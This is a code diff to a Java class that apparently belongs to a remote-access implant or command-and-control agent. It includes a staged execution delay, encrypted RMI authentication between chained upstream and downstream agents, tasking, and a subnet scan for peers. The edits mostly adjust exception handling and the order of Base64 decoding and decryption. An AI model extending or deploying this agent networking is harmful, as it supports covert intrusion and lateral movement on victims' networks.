@@ -115,7 +115,7 @@ public class Main
     static public P2PInterface ifaceP2P = null;
     static private security secInst = new security();
 
-    public static void main(String[] args) throws ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
+    public static void main(String[] args) throws RemoteException, ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
     {
         //add execution delay of 10 minutes +/- to 1st stage
         sessUUID = UUID.randomUUID().toString();
@@ -143,7 +143,14 @@ public class Main
         Thread t = new Thread(new Runnable() {
             public void run() {
                 P2PServer srvObj = new P2PServer();
-                srvObj.rmiServer();
+                try
+                {
+                    srvObj.rmiServer();
+                }
+                catch (Exception e)
+                {
+                    
+                }
             }
         });
         t.start();
@@ -200,12 +207,13 @@ public class Main
                     tasks = (ArrayList) authData.get("tasks");
 
                     config.encKey = new String(
-                        Base64.getDecoder().decode(
-                            secInst.decrypt(
-                                cookieEncrypted.getBytes(),
-                                config.defaultKey.getBytes(), 
-                                ephemeralNonce.getBytes()
-                            )
+
+                        secInst.decrypt(
+                            Base64.getDecoder().decode(
+                                cookieEncrypted.getBytes()
+                            ),
+                            config.defaultKey.getBytes(), 
+                            ephemeralNonce.getBytes()
                         )
                     );
                     break;
@@ -584,7 +592,7 @@ public class Main
 
     public static class P2PServer
     {
-        public void rmiServer()
+        public void rmiServer() throws Exception, RemoteException
         {
             Registry nRegistry = LocateRegistry.createRegistry(config.upstreamPort);
 
@@ -597,10 +605,10 @@ public class Main
     public interface P2PInterface extends Remote
     {
         //creates cookie session object and adds uuid to downstream agents
-        public Hashtable auth(String uuid, String passwd, String nonce) throws RemoteException;
-        public String put(String uuid, String cookie, String nonce, ArrayList data) throws RemoteException;
+        public Hashtable auth(String uuid, String passwd, String nonce) throws RemoteException, Exception;
+        public String put(String uuid, String cookie, String nonce, ArrayList data) throws RemoteException, Exception;
         //stop being a downstream agent, need to make sure tasking prioritizes checking upstream agents for a uuid before swapping to downstream
-        public String disconnect(String uuid, String cookie, String nonce) throws RemoteException;
+        public String disconnect(String uuid, String cookie, String nonce) throws RemoteException, Exception;
     }
 
     public static class P2PSrvImpl extends UnicastRemoteObject implements P2PInterface
@@ -611,7 +619,7 @@ public class Main
             super();
         }
 
-        public Hashtable auth(String uuid, String passwd, String downstreamNonce) throws RemoteException
+        public Hashtable auth(String uuid, String passwd, String downstreamNonce) throws RemoteException, Exception
         {
             security secInst = new security();
             Hashtable authData = new Hashtable();
@@ -626,12 +634,13 @@ public class Main
             }
 
             String authBlob = new String(
-                Base64.getDecoder().decode(
-                    secInst.decrypt(
-                        passwd.getBytes(),
-                        currentKey.getBytes(),
-                        downstreamNonce.getBytes()
-                    )
+                
+                secInst.decrypt(
+                    Base64.getDecoder().decode(
+                        passwd.getBytes()
+                    ),
+                    currentKey.getBytes(),
+                    downstreamNonce.getBytes()
                 )
             );
             if (authBlob.equals(config.passMat))
@@ -677,16 +686,17 @@ public class Main
             }
         }
 
-        public String put(String uuid, String cookie, String downstreamNonce, ArrayList data) throws RemoteException
+        public String put(String uuid, String cookie, String downstreamNonce, ArrayList data) throws Exception, RemoteException
         {
             security secInst = new security();
             String authBlob = new String(
-                Base64.getDecoder().decode(
-                    secInst.decrypt(
-                        cookie.getBytes(),
-                        config.encKey.getBytes(),
-                        downstreamNonce.getBytes()
-                    )
+                
+                secInst.decrypt(
+                    Base64.getDecoder().decode(
+                        cookie.getBytes()
+                    ),
+                    config.encKey.getBytes(),
+                    downstreamNonce.getBytes()
                 )
             );
             if (downstreamAgents.keySet().contains(uuid) && downstreamAgents.get(uuid).toString().equals(authBlob))
@@ -703,16 +713,16 @@ public class Main
             }
         }
 
-        public String disconnect(String uuid, String cookie, String downstreamNonce) throws RemoteException
+        public String disconnect(String uuid, String cookie, String downstreamNonce) throws Exception, RemoteException
         {
             security secInst = new security();
             String authBlob = new String(
-                Base64.getDecoder().decode(
-                    secInst.decrypt(
-                        cookie.getBytes(),
+                secInst.decrypt(
+                    Base64.getDecoder().decode(
+                        cookie.getBytes()
+                    ),
                         config.encKey.getBytes(),
                         downstreamNonce.getBytes()
-                    )
                 )
             );
             if (downstreamAgents.keySet().contains(uuid) && downstreamAgents.get(uuid).toString().equals(authBlob))
@@ -727,7 +737,7 @@ public class Main
         }
 
 
-        public String mkCookie(String uuid, String passMat)
+        public String mkCookie(String uuid, String passMat) throws NoSuchAlgorithmException
         {
             utilitarian nUtil = new utilitarian();
             String timeStamp = new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date());
@@ -809,7 +819,7 @@ public class Main
             return subnetAddrs;
         }
 
-        public ArrayList findP2P()
+        public ArrayList findP2P() throws SocketException
         {
             ArrayList ipAddresses = new ArrayList();
 
